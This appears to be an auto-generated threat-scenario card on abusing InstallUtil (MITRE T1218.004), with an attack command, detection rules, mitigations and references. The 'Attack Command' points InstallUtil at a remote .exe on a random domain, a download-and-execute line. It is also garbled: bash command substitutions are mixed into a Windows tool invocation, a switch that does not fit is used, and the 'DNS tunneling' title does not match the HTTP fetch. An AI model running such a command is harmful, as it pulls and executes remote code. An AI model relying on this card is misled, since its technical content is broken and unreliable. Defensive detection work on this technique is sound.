---
type: campaign
scenario_id: 449
tactic: Defense Evasion
technique: "T1218.004: InstallUtil"
technique_id: T1218.004
tags: [campaign, lotl, defense_evasion]
---

# Using InstallUtil to execute DNS tunneling .NET assembly.

## Threat Description
Using InstallUtil to execute DNS tunneling .NET assembly.

## Attack Command
```
InstallUtil /U http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo dnstunnel$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).exe) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)
```

## Detection Logic
Monitor InstallUtil HTTP: `wmic process where name='InstallUtil.exe' get commandline | findstr http`; YARA rule: `rule InstallUtilDnsTunnel { strings: $a = /InstallUtil.*http/ nocase; condition: $a }`.

## Mitigation
Restrict InstallUtil: `icacls %windir%\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /deny Everyone:RX`; Block .NET downloads: `netsh advfirewall firewall add rule name='Block InstallUtil' dir=out program='%windir%\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe' action=block`.

## AI Training Prompt
Train AI to detect InstallUtil-based DNS tunneling .NET execution by analyzing HTTP downloads, InstallUtil command-line arguments, and DNS query patterns; suggest .NET download restrictions.

## References
- MITRE ATT&CK T1218.004: https://attack.mitre.org/techniques/T1218/004/
- CWE-78: https://cwe.mitre.org/data/definitions/78.html
